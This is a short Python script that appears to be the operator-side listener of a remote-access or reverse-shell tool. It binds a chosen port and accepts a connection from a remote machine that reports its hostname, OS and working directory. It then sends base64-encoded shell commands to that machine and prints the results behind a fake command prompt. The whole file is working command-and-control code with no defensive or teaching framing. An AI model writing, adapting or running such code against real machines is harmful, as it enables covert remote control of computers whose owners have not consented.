import socket, os, sys, time, base64

delPortFile = "delPort.txt"

def createSocket():
	try:
		global host
		global port
		global s

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = ''
		try:
			port = sys.argv[1]
		except:
			port = input('Type Port For Listening: ')

		while not port:
			port = input('Type Port For Listening: ')

		port = int(port)
	except socket.error as msg:
		print('Socket Error:', msg)

def bindSocket():
	try:
		print('Binding Socket To Port:', port)

		s.bind((host,port))

		s.listen(1)

	except socket.error as msg:
		print('Socket Binding Error:', msg)

		bindSocket()

def acceptSocket():
	global conn
	global addr
	global hostname
	global operatingSystem
	global currentPath
	os.system('cls')

	try:
		conn, addr = s.accept()
		print('Session Opend at %s:%s \n'%(addr[0], addr[1]))
		data = conn.recv(1024).decode().split(',')
		hostname = str(data[0])
		operatingSystem = str(data[1])
		currentPath = str(data[2])
		menu()
	except socket.error as msg:
		print('Socket Accepting Error:', msg)

def menu():
	global currentPath
	while True:
		cmd = input(hostname + '(' + operatingSystem + ')@' + currentPath + '> ')
		while cmd == "":
			cmd = input(hostname + '(' + operatingSystem + ')@' + currentPath + '> ')
		if cmd == 'exit':
			f = open(delPortFile, "w+")
			f.write(str(port))
			f.close()
			conn.send(cmd.encode('utf8'))
			time.sleep(5)
			conn.close()
			s.close()
			sys.exit()

		command = conn.send(base64.encodebytes(cmd.encode('utf8')))
		result = base64.decodebytes(conn.recv(16834)).decode()

		if result[:12] == 'currentPath:':
			currentPath = result[12:]
		elif result != hostname:
			print(result)

def main():
	createSocket()
	bindSocket()
	acceptSocket()

main()